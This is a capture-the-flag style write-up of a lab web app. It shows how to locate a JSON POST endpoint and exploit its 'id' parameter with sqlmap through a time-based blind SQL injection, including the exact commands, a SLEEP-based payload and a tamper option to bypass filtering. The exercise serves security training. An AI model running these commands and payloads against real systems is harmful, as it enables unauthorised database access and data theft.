# Background

We've been given access to a web app with basic protections.

Let's use SQLMap to find the SQLi vulnerabilities and then exploit them!





# Recon:

After clicking around we'll see that the webpage contains many forms, but most contain action="#", which simply sends us to the top of the page, and doesnt seem to send out any data.

Lets use sqlmap to crawl the site:

    $ sqlmap --threads=10 --batch -u http://154.57.164.73:30418 --forms --crawl=3

- This finds 4 targets, and test 2 of them:

      POST http://154.57.164.73:30418/shop.html people=%23&people=%23

      GET http://154.57.164.73:30418/checkout.html?=&optradio=on

- The others were skipped, likely due to a lack of input parameters.

Lets go to http://154.57.164.73:30418/shop.html and see what we find.

<p align="center">
    <img width="1014" height="925" alt="shop" src="https://github.com/user-attachments/assets/d9b15d79-99f1-40f7-890b-386039012ed4" />
</p>

If we look in DevTools, we'll find a POST method for the "Price Range", however if we try to change the values nothing happens. But more interstingly, wheres a <script> tag at the bottom of the page:

    <script>
        $(".add-to-cart").click(function(event) {
            event.preventDefault();
    
            let xhr = new XMLHttpRequest(); 
            let url = "action.php"; 
        
            xhr.open("POST", url, true); 
            xhr.setRequestHeader("Content-Type", "application/json"); 
    
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) { 
                    alert("Item added!!!")
                }
            };
    
            var data = JSON.stringify({ "id": 1 }); 
            xhr.send(data); 
        });
      </script>

If we search for "add-to-cart", we'll see its linked to these buttons:

<p align="center">
    <img width="1013" height="925" alt="addtocart" src="https://github.com/user-attachments/assets/a680f027-eb3b-4f84-94b5-2d9c6f0f53c1" />
</p>

Lets target this form, first go the the Network tab (in DevTools), then click the "ADD TO CART" button, after that well see the POST request to action.php:

<p align="center">
    <img width="1012" height="926" alt="action" src="https://github.com/user-attachments/assets/ce9c984a-4c21-41eb-91b3-f7ccb6187542" />
</p>

Right click on the POST entry, and click on "Copy Value", then click on "Copy Request Headers".

Paste the values into a text file, which I'm going to name as request.txt,

Then go back and Copy POST Data and add it to request.txt.


# Attack:

Now that the request file, has been made see if we can get an injection.

    sqlmap --threads=10 --batch -r request.txt --random-agent


The scan reveals that the form is injectable.

    ---
    Parameter: JSON id ((custom) POST)
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: {"id":"1 AND (SELECT 2014 FROM (SELECT(SLEEP(5)))Bicq)"}
    ---

However we do also have this warning:

    [WARNING] it appears that the character '>' is filtered by the back-end server. You are strongly advised to rerun with the '--tamper=between'

Now that we've found a way in with a time-based blind SQL injection, lets enumerate the database and search for the "final_flag" table:

    sqlmap --batch -r request.txt --random-agent --technique=T --dbms=MySQL --tamper=between --search -T final_flag

- Note:
    - When using a time-based blind injection sqlmap extracts data by individual characters. A timeout or an unstable network can cause you obtain an incomplete or incorrect flag.
    - It this happens, try to increase the number of retries (--retries), the delay from the DBMS response (--time-sec), or the delay between each HTTP request (--delay).
